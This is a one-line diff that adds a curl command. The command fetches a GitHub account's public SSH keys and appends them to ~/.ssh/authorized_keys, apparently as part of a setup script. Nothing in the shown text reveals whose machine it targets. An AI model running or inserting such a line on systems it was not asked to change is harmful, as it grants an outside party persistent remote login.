@@ -1,0 +1,1 @@
+curl -s https://github.com/arwichok.keys >> ~/.ssh/authorized_keys
